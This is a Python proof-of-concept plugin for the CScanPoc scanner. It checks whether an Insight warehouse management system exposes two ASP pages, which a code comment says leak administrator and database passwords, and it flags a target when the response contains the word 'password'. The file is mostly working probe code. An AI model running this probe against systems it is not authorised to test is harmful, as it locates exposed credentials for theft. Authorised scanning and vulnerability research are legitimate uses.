# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Insight_0012'  # 平台漏洞编号，留空
    name = 'insight仓储管理系统 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-08-01'  # 漏洞公布时间
    desc = '''
        Insight仓储管理系统
        /gjdcx/ljsz.asp
        /gjdcx/yhgl.asp
        信息泄露。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0129390'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Insight(英赛特仓储管理系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ae0f00bf-0873-4b91-a8cd-46a8a874ce1e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-0129390
            # http://www.wooyun.org/bugs/wooyun-2010-0129392
            hh = hackhttp.hackhttp()
            # 信息泄露（包括管理员账号密码，数据库账号密码）
            payloads = [
                self.target + '/gjdcx/ljsz.asp',
                self.target + '/gjdcx/yhgl.asp'
            ]
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)

                if code == 200 and '密码'.decode('utf-8').encode('gb2312') in res:
                    #security_hole('info disclosure: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
